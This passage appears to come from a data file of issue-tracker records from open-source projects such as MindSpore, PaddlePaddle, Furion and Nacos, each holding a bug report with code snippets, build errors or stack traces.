size=(3,)).astype(np.int32)) global_step = Tensor(np.random.randint(-128, 128, dtype=np.int64)) inputs_list = [var, grad, grad_accum, grad_square_accum, indices, lr, l1, l2, global_step] net = nn_ops.SparseApplyAdagradDA(use_locking=False) fact = AnyNetFactory(net=net) with pytest.raises(TypeError): &gt; fact(*inputs_list) E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; def test_p_sparseapplyadagradda_grad_square_accum_not_parameter(): var = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) grad_accum = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) grad_square_accum = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) lr = Tensor(np.random.random(), dtype=mstype.float16) l1 = Tensor(np.random.random(), dtype=mstype.float16) l2 = Tensor(np.random.random(), dtype=mstype.float16) grad = Tensor(np.random.uniform(0, 128, size=(3, 4)).astype(np.float16)) indices = Tensor(np.random.uniform(0, 2, size=(3,)).astype(np.int32)) global_step = Tensor(np.random.randint(-128, 128, dtype=np.int64)) inputs_list = [var, grad, grad_accum, grad_square_accum, indices, lr, l1, l2, global_step] net = nn_ops.SparseApplyAdagradDA(use_locking=False) fact = AnyNetFactory(net=net) with pytest.raises(TypeError): &gt; fact(*inputs_list) E Failed: DID NOT RAISE &lt;class 'TypeError'&gt;"
【众智】【计算-AICPU开发】AvgPoolGrad,"AICPU算子接入 AvgPool的反向 Python层接口（ 因库上接口与IR不一致，故改名V1 ） 接口目录：mindspore/ops/operations/_grad_ops.py orig_input_shape input_grad out_grad ksize ListInt 必选属性 strides ListInt 必选属性 padding String 必选属性 data_format String 可选属性 对应底层算子 对应底层AICPU算子AvgPoolGrad TF接口：tf.raw_ops.AvgPoolGrad 3. 异常处理 4. 算子反向 无反向   <code>: class AvgPoolGradV1(Primitive): REG_OP(AvgPoolGrad) .INPUT(orig_input_shape, TensorType({DT_INT32})) .INPUT(input_grad, TensorType({DT_FLOAT16, DT_FLOAT32, DT_DOUBLE})) .OUTPUT(out_grad, TensorType({DT_FLOAT16, DT_FLOAT32, DT_DOUBLE})) .REQUIRED_ATTR(ksize, ListInt) .REQUIRED_ATTR(strides, ListInt) .REQUIRED_ATTR(padding, String) .ATTR(data_format, String, ""NHWC"") .OP_END_FACTORY_REG(AvgPoolGrad)"
加了筛选为false 生成的PDF文件还是会有筛选,"结果导出的excel 还有筛选   <code>: var config = new OpenXmlConfiguration() { AutoFilter = false, TableStyles = TableStyles.None, }; MiniExcel.SaveAs(filename, reader, true, ""Sheet1"", ExcelType.XLSX, config);"
online表单开发-同步数据库异常,版本号：   <code>: 2.3 首次同步后再次修改，选择普通同步，会提示其他数据库相同表名里的字段错误，选择强制同步没有问题，但本项目并没有连其他数据库。 如下图中，mall_shipping.logistics_name字段并不存在，实为同一数据库服务器内的其他数据库的同表名字段。
Toast 组件 Code Demo 完善,Demo中代码少一个关键步骤   <code>: private Toast? Toast { get; set; }
Check system's protobuf for internal users,"jumbo install protobuf set gcc and mkl <ol start=""3""> make -j8   <code>: cmake .. -DCMAKE_CXX_COMPILER=/opt/compiler/gcc-4.8.2/bin/g++ -DCMAKE_C_COMPILER=/opt/compiler/gcc-4.8.2/bin/gcc -DMKL_ROOT=xxxx"
admin/goods/detail少了数据assign的语句，后台无法查看商品详情,"admin/goods/detail少了语句，详情看不了   <code>: MyViewAssign('data', $data);"
[GraphKernel] bert lamb run fail with graph kernel,": /device gpu Use lamb optimizer(default in config.py) to run bert base on gpu. 用akg单独跑Json全部通过，应该不是akg问题 run pass   <code>: epoch: 0, current epoch percent: 0.000, step: 20, outputs are [nan] epoch time: 582676.538 ms, per step time: 29133.827 ms epoch: 0, current epoch percent: 0.000, step: 40, outputs are [nan] epoch time: 8229.582 ms, per step time: 411.479 ms epoch: 0, current epoch percent: 0.000, step: 60, outputs are [nan] epoch time: 8219.723 ms, per step time: 410.986 ms epoch: 0, current epoch percent: 0.000, step: 80, outputs are [nan] epoch time: 8244.276 ms, per step time: 412.214 ms [ERROR] DEVICE(5416,python):2021-05-15-16:02:12.739.820 [mindspore/ccsrc/backend/kernel_compiler/akg/gpu/akg_gpu_kernel_mod.cc:114] Launch] Launch kernel failed, error: CUDA_ERROR_ILLEGAL_ADDRESS [ERROR] DEVICE(5416,python):2021-05-15-16:02:12.739.863 [mindspore/ccsrc/runtime/device/gpu/gpu_kernel_runtime.cc:713] LaunchKernelDynamic] Launch kernel failed: Default/GraphKernel_ReduceSum_split-op55048 [ERROR] DEVICE(5416,python):2021-05-15-16:02:12.798.775 [mindspore/ccsrc/runtime/device/gpu/gpu_kernel_runtime.cc:260] ReleaseDeviceRes] Op Error: Could not destroy gpu data queue. | Error Number: 0 Traceback (most recent call last): File ""../run_pretrain.py"", line 291, in &lt;module&gt; run_pretrain() File ""../run_pretrain.py"", line 286, in run_pretrain dataset_sink_mode=(args_opt.enable_data_sink == ""true""), sink_size=20) File ""/home/chenlei/mindspore/build/package/mindspore/train/model.py"", line 627, in train sink_size=sink_size) File ""/home/chenlei/mindspore/build/package/mindspore/train/model.py"", line 413, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/chenlei/mindspore/build/package/mindspore/train/model.py"", line 475, in _train_dataset_sink_process outputs = self._train_network(*inputs) File ""/home/chenlei/mindspore/build/package/mindspore/nn/cell.py"", line 344, in __call__ out = self.compile_and_run(*inputs) File ""/home/chenlei/mindspore/build/package/mindspore/nn/cell.py"", line 627, in compile_and_run return _executor(self, *new_inputs, phase=self.phase) File ""/home/chenlei/mindspore/build/package/mindspore/common/api.py"", line 574, in __call__ return self.run(obj, *args, phase=phase) File ""/home/chenlei/mindspore/build/package/mindspore/common/api.py"", line 602, in run return self._exec_pip(obj, *args, phase=phase_real) File ""/home/chenlei/mindspore/build/package/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/home/chenlei/mindspore/build/package/mindspore/common/api.py"", line 585, in _exec_pip return self._executor(args_list, phase) RuntimeError: mindspore/ccsrc/runtime/device/gpu/gpu_kernel_runtime.cc:713 LaunchKernelDynamic] Launch kernel failed: Default/GraphKernel_ReduceSum_split-op55048 # Error in atexit._run_exitfuncs: RuntimeError: mindspore/ccsrc/runtime/device/gpu/gpu_kernel_runtime.cc:260 ReleaseDeviceRes] Op Error: Could not destroy gpu data queue. | Error Number: 0"
[MS][LITE] TfliteDepthwiseConv2DParser::Parse incorrectly computes padding,: /device gpu /device cpu : -- MindSpore version : v1.0.0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : TfliteDepthwiseConv2DParser::Parse takes input tensor 1 (which is the tensor with convolution weights) to compute padding. This leads to incorrectly computed padding parameters. This is the problematic line in file : It should be DepthwiseConv2D::InferShape recomputes padding to work around this issue. Please fix the typo in the converter so correct padding is stored in flatbuffer files.   <code>: mindspore/lite/tools/converter/parser/tflite/tflite_depthwise_conv_parser.cc // get the data tensor auto data_index = tflite_op-&gt;inputs[1]; auto data_index = tflite_op-&gt;inputs[0]; .ms
增加 IsPopover 参数用于控制下拉框渲染模式,不包含 等与项目无关文件的压缩包 或者 代码仓库地址 增加 IsPopover 参数用于控制下拉框渲染模式- 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: bin obj
数据库迁移[Timestamp] 并发标记每次都重新生成,"Furion 版本号 3.1.4 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 每次迁移数据库，都会生成迁移，但是实际没发生任何改变。 https://docs.microsoft.com/zh-cn/ef/core/modeling/concurrency?tabs=data-annotations#timestamprowversion 使用[Timestamp]进行并发控制，再测试Microsoft.EntityFrameworkCore 和 Pomelo.EntityFrameworkCore.MySql 不存在每次迁移都进行生成的问题 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 您的代码下载地址？ https://github.com/FatuityCookie/heel Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 不生成迁移   <code>: public class Person : IEntity&lt;MasterDbContextLocator, SlaveDbContextLocator&gt;,IEntityTypeBuilder&lt;Person&gt; { /// &lt;summary&gt; /// 主键Id /// &lt;/summary&gt; [Key] [DatabaseGenerated(DatabaseGeneratedOption.Identity)] public int Id { get; set; } /// &lt;summary&gt; /// 名称 /// &lt;/summary&gt; public string Name { get; set; } /// &lt;summary&gt; /// 年龄 /// &lt;/summary&gt; public int Age { get; set; } [Timestamp] public byte[] ConcurrencyToken { get; set; } public void Configure(EntityTypeBuilder&lt;Person&gt; entityBuilder, DbContext dbContext, Type dbContextLocator) { //entityBuilder.Property(p =&gt; p.ConcurrencyToken).IsRowVersion(); } } migrationBuilder.AlterColumn&lt;DateTime&gt;( name: ""ConcurrencyToken"", table: ""Person"", type: ""timestamp(6)"", rowVersion: true, nullable: true, oldClrType: typeof(DateTime), oldType: ""timestamp(6)"", oldRowVersion: true, oldNullable: true) .Annotation(""MySql:ValueGenerationStrategy"", MySqlValueGenerationStrategy.ComputedColumn);"
LambdaQuery查询时使用addParam(Objcet o)报sql异常“无效的列类型”,"数据库使用oracle，目的是使用LambdaQuery进行分页查询，代码如下： 异常日志：Caused by: java.sql.SQLException: 处理第1个参数错误:无效的列类型   <code>: OcrckTemp queryOcrckTemp = new OcrckTemp(); queryOcrckTemp.setBatchno(batchno); if(StringUtil.isNotEmpty(fpstate)){ queryOcrckTemp.setFpstate(fpstate); } PageQuery&lt;OcrckTemp&gt; pageQuery = ocrckTempDao.createLambdaQuery() .addParam(queryOcrckTemp) .asc(OcrckTemp::getAutoid) .page(queryParam.getPageNumber(), 10);"
Check failed: stat == CUBLAS_STATUS_SUCCESS (13 vs. 0) ,"I have a script that can run normally on cpu-mode(--use_gpu=False), but the following error occurs when I use gpu-mode(--use_gpu=True)： p.s: paddle version is 0.11.0-gpu. Does anybody know how to solve this problem? Thanks!   <code>: F1214 10:55:30.027999 10 hl_cuda_cublas.cc:386] Check failed: stat == CUBLAS_STATUS_SUCCESS (13 vs. 0) [cublas status]: execution failed *** Check failure stack trace: *** @ 0x7fd13040127d google::LogMessage::Fail() @ 0x7fd130404d2c google::LogMessage::SendToLog() @ 0x7fd130400da3 google::LogMessage::Flush() @ 0x7fd13040623e google::LogMessageFatal::~LogMessageFatal() @ 0x7fd1303b29ff hl_matrix_mul_vector() @ 0x7fd1303b2f61 hl_matrix_mul() @ 0x7fd130221ab7 paddle::GpuMatrix::mul() @ 0x7fd130222111 paddle::GpuMatrix::mul() @ 0x7fd13008a8cf paddle::FullyConnectedLayer::forward() @ 0x7fd130106f6d paddle::NeuralNetwork::forward() @ 0x7fd12ff7e68d _wrap_GradientMachine_forward @ 0x4cb755 PyEval_EvalFrameEx @ 0x4c2705 PyEval_EvalCodeEx @ 0x4ca7df PyEval_EvalFrameEx @ 0x4c2705 PyEval_EvalCodeEx @ 0x4ca7df PyEval_EvalFrameEx @ 0x4ddd6a (unknown) @ 0x4c4bdc PyEval_EvalFrameEx @ 0x4ddd6a (unknown) @ 0x4c4bdc PyEval_EvalFrameEx @ 0x4c2705 PyEval_EvalCodeEx @ 0x4ca088 PyEval_EvalFrameEx @ 0x4c2705 PyEval_EvalCodeEx @ 0x4ca088 PyEval_EvalFrameEx @ 0x4ddd6a (unknown) @ 0x4c4bdc PyEval_EvalFrameEx @ 0x4ddd6a (unknown) @ 0x4c4bdc PyEval_EvalFrameEx @ 0x4ddd6a (unknown) @ 0x50f41f (unknown) @ 0x4c4bdc PyEval_EvalFrameEx @ 0x4c2705 PyEval_EvalCodeEx"
文件类型判断不准确的问题,测试了PDF文件，文件头应该是这样的   <code>: 255044462D312E340A25D3EBE9E10A312030206F626A0A3C3C2F4372 255044462d312e330d 255044462D312E 504B030414000600080000002100096A270D7A010000AD0600001300 504B03040A0000000000874EE2400000000000000000000000000900
文档“基本使用概念”的修改,修改原因： 配置示例是基于v1 api，需要修改成v2 api。 很多基本概念，如，在v2 api发布后，需要进行删减或重新撰写。等。 分布式训练：原先是采用mpi集群的方式进行描述的，现在也需进行更新。 修改文件：一个中文文件 基本使用概念 网页链接：develop分支的基本使用概念   <code>: PyDataProvider2
【众智】【计算-AICPU开发】Nansum,"该任务变更为【计算-用户接口】Nansum 返回给定轴上的数组元素总和。 数据类型：bool、int8、int16、int32、int64、uint8、uint16、uint32、uint64、fp16、fp32、fp64 对标算子： torch 1.8.1 torch.nansum https://pytorch.org/docs/1.8.1/generated/torch.nansum.html#torch.nansum 3. 异常处理 4. 算子反向 库上自动求导已实现   <code>: def nansum(x: Tensor, axis: Union[int, tuple/list], keepdims=False, *, dtype=None) -&gt; Tensor:"
引入增强模式，报错，项目无法启动，提示找不到文件，报错的日志如下,"APPLICATION FAILED TO START Description: An attempt was made to call a method that does not exist. The attempt was made from the following location: The following method did not exist: The method's class, springfox.documentation.spi.service.contexts.RequestMappingContext, is available from the following locations: It was loaded from the following location: Action: Correct the classpath of your application so that it contains a single, compatible version of springfox.documentation.spi.service.contexts.RequestMappingContext Process finished with exit code 1   <code>: com.github.xiaoymin.knife4j.spring.plugin.OperationDynamicResponseModelProvider.apply(OperationDynamicResponseModelProvider.java:47) springfox.documentation.spi.service.contexts.RequestMappingContext.findAnnotation(Ljava/lang/Class;)Ljava/util/Optional; jar:file:/C:/Users/XZC/.m2/repository/io/springfox/springfox-spi/2.9.2/springfox-spi-2.9.2.jar!/springfox/documentation/spi/service/contexts/RequestMappingContext.class file:/C:/Users/XZC/.m2/repository/io/springfox/springfox-spi/2.9.2/springfox-spi-2.9.2.jar"
Dev branch build fails.,"When building the lasted dev branch the following compiling error happens:   <code>: [100%] Built target gtest_main Install the project... -- Install configuration: """" -- Installing: /usr/local/lib/libgmock.a CMake Error at googlemock/cmake_install.cmake:36 (file): file INSTALL cannot copy file ""/home/travis/build/PaddlePaddle/Paddle/build_android/third_party/gtest/src/extern_gtest-build/googlemock/libgmock.a"" to ""/usr/local/lib/libgmock.a"". Call Stack (most recent call first): cmake_install.cmake:37 (include) make[3]: *** [install] Error 1 make[2]: *** [third_party/gtest/src/extern_gtest-stamp/extern_gtest-install] Error 2 make[1]: *** [CMakeFiles/extern_gtest.dir/all] Error 2 make: *** [all] Error 2 The command ""timeout 2580 paddle/scripts/travis/${JOB}.sh # 43min timeout RESULT=$?; if [ $RESULT -eq 0 ] || [ $RESULT -eq 142 ]; then true; else false; fi; "" exited with 1. cache.2 store build cache"
cli.ps1生成实体时，增加字段备注，有助于写代码,备注放到字段上面，有助于代码提示   <code>: /// &lt;summary&gt; /// 备注ID /// &lt;/summary&gt; public string RemarkID { get; set; }
 修复远程请求接口如果是 `gbk` 编码导致序列化中文出现乱码,"使用远程请求过程中，如果目标地址响应报文内容格式为 且包含中文，则反序列化后出现乱码。 相关资料 编写更新日志内容 期望效果 258a9b3   <code>: charset=gbk public class GetAaddrOutput { public string Ip { get; set; } public string pro { get; set; } public string proCode { get; set; } public string city { get; set; } public string cityCode { get; set; } public string region { get; set; } public string regionCode { get; set; } public string addr { get; set; } public string regionNames { get; set; } public string err { get; set; } } var result = await ""http://whois.pconline.com.cn/ipJson.jsp?json=true"".GetAsAsync&lt;GetAaddrOutput&gt;(); xxxAsStreamAsync Stream Encoding xxxAsAsync&lt;T&gt; gbk // 返回元组 var (stream, encoding) = await ""https://www.furion.icu/"".GetAsStreamAsync(); // 包含序列化正常 var result = await ""http://whois.pconline.com.cn/ipJson.jsp?json=true"".GetAsAsync&lt;GetAaddrOutput&gt;();"
代数化简后续优化,"RFC 一、支持常量折叠 目前后端不支持常量折叠，这意味着很多代数化简的公式不能使用； 以为例： 这条在网络中较为常见，但是化简后需要进一步将化简为的常量，如果不做常量折叠则会AKG报错； 所以目前需要进一步做常量折叠的公式都没有支持起来。 列了下目前三个网络上的代数化简结果： 本地测试用例 Ocean Model tinybert 算子个数 14 3717 3562 目前优化 3 1 2 速度提升 16.67% 0% 0% 加入常量折叠后可优化 5 137 22 二、公式扩展 目前支持的公式相对简单，不算常量折叠一共31条，在识别广度上有一定局限性。 以为例： 目前可以识别的图结构为： 还有一些相对复杂公式比如Transpose，Reshape相关没有实现，目前主要支持elemwise相关，后续需要单独实现。 Trail No. Task Description 工作量 难度 1 常量折叠 高 低 2 公式扩展 低 低 3 精度问题 低 高 4 其他负责公式 低 低   <code>: ""Add(const1,Add(A,cosnt2))=Add(A,Add(const1,const2))"" Add(const1,const2) const1+const2 ""Mul(Sqrt(A),Sqrt(A))=A"" Sqrt(A)"
InsertGradientOf文档用例不能直接运行,"/ 硬件环境: /device ascend /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): PyNative &amp;&amp; Graph /mode pynative /mode graph 打开文档,复制文档上的用例：https://www.mindspore.cn/docs/api/zh-CN/r1.5/api_python/ops/mindspore.ops.InsertGradientOf.html#mindspore.ops.InsertGradientOf 添加import，设置环境 执行 输出结果 Segmentation fault 修改方案： one = Tensor([1.0]) ptwo = Tensor([0.2]) def clip_gradient(dx): ret = dx if ret &gt; one: ret = one clip = ops.InsertGradientOf(clip_gradient) grad_all = C.GradOperation(get_all=True) def InsertGradientOfClipDemo(): def clip_test(x, y): x = clip(x) y = clip(y) c = x * y return c InsertGradientOfClipDemo()   <code>: if ret &lt; ptwo: ret = ptwo return ret @ms_function def f(x, y): return clip_test(x, y) def fd(x, y): return grad_all(clip_test)(x, y) print(""forward: "", f(Tensor([1.1]), Tensor([0.1]))) print(""clip_gradient:"", fd(Tensor([1.1]), Tensor([0.1])))"
【MindSpore】【Ascend】【C类】【RefineDet】export导出air，精度不达标，需要做修改,"【RefineDet】export导出air，精度不达标，需要做修改，设置is_traning参数都是Flase，转出air精度达标 请修改脚本 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: Please delete the backend not involved / 请删除不涉及的后端: /device ascend : --CANN 版本: (CANN 5.0.4.B065) --MindSpore 版本: mindspore 1.6.1 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 Steps to reproduce the issue / 重现步骤 1）执行模型冻结命令python3 export.py --ckpt_file LOG1/ckpt/ckpt_1/refinedet-500_458.ckpt --file_format AIR 2）air转换为om bash air2om.sh refinedet_train_false.air /data1/MindSpore/RefineDet/infer/data/model/refinedet ./aipp.config 3）执行sdk推理 python3 main.py --pipeline_path ../data/config/refinedet.pipeline --img_path /data1/MindSpore/nas-fpn/data/coco2017/val2017/ --res_path ./result/ 4）评估精度 python3 perf/eval_by_sdk.py 结果： 1)标准精度mAP:28.69%；得出精度不达标，超出0.5%的范围 Related log / screenshot / 日志 / 截图   <code>: root@633aaa49f795:/data1/MindSpore/RefineDet/infer/sdk# python3 perf/eval_by_sdk.py loading annotations into memory... Done (t=0.60s) creating index... index created! first dataset is 5000 Loading and preparing results... DONE (t=10.71s) creating index... index created! Running per image evaluation... Evaluate annotation type *bbox* DONE (t=78.47s). Accumulating evaluation results... DONE (t=19.59s). Average Precision (AP) @[ IoU=0.50:0.95 | area= all | maxDets=100 ] = 0.288 Average Precision (AP) @[ IoU=0.50 | area= all | maxDets=100 ] = 0.446 Average Precision (AP) @[ IoU=0.75 | area= all | maxDets=100 ] = 0.301 Average Precision (AP) @[ IoU=0.50:0.95 | area= small | maxDets=100 ] = 0.072 Average Precision (AP) @[ IoU=0.50:0.95 | area=medium | maxDets=100 ] = 0.301 Average Precision (AP) @[ IoU=0.50:0.95 | area= large | maxDets=100 ] = 0.449 Average Recall (AR) @[ IoU=0.50:0.95 | area= all | maxDets= 1 ] = 0.288 Average Recall (AR) @[ IoU=0.50:0.95 | area= all | maxDets= 10 ] = 0.461 Average Recall (AR) @[ IoU=0.50:0.95 | area= all | maxDets=100 ] = 0.502 Average Recall (AR) @[ IoU=0.50:0.95 | area= small | maxDets=100 ] = 0.208 Average Recall (AR) @[ IoU=0.50:0.95 | area=medium | maxDets=100 ] = 0.560 Average Recall (AR) @[ IoU=0.50:0.95 | area= large | maxDets=100 ] = 0.700 ======================================== mAP: 0.2275478011814521 root@633aaa49f795:/data1/M"
JFinal2.1 验证码cookie问题反馈,"@JFinal 经过测试，使用js刷新验证码后，浏览器端cookie值未变，最后提交验证的cookie还是老的值，导致验证失败的bug。   <code>: 多次测试证实：页面加载完成后，使用js给img标签赋值请求验证码，这时候后台获取的cookie是空值，提交验证时，读取cookie里面验证码为null，只有当页面刷新的时候，验证验证码才是正常的。 &lt;img src=""/get_captcha"" id=""captchaImg"" /&gt; &lt;!-- 省略... --&gt; &lt;script&gt; $(""#captchaImg"").on(""click"", function(){ $(this).attr(""src"", ""/get_captcha/?t="" + new Date().getTime()); }); &lt;/script&gt;"
配置陪context-path后，有很多url不对的问题,我在配置文件中追加了context-path后 例如：Server端 菜单中【监控列表】【构建列表】出现404错误；点击【退出登录】后出现系统错误等错误现象。 原因都是因为提交的url中有的是多个“/server”，有的是少了“/server”导致的。 追加context-path的原因是便于nginx的代理，请问在context-path配置这块有那些点要注意一下，可以说明一下吗？   <code>: context-path: /server
mac m1 启动nacos报错,"mac 11.4 jdk 8 nacos 2.0.2 pig版本: pigx 4.0 是否修改包名: 否 启动nacos 服务   <code>: 2021-07-26 17:56:24.558 ERROR 7403 --- [ main] c.a.n.c.l.StartingApplicationListener : Startup errors : org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'instanceOperatorClientImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/InstanceOperatorClientImpl.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.alibaba.nacos.DigitalNacosApplication.main(DigitalNacosApplication.java:39) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 19 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/Users/wangwei/maven_repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.UnsatisfiedLinkError: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: dlopen(/private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib, 1): no suitable image found. Did find: /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture /private/var/folders/3m/s4f08zv97cd24zb2xd9jw23r0000gn/T/librocksdbjni5085753294060122530.jnilib: mach-o, but wrong architecture at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:315) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:296) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at 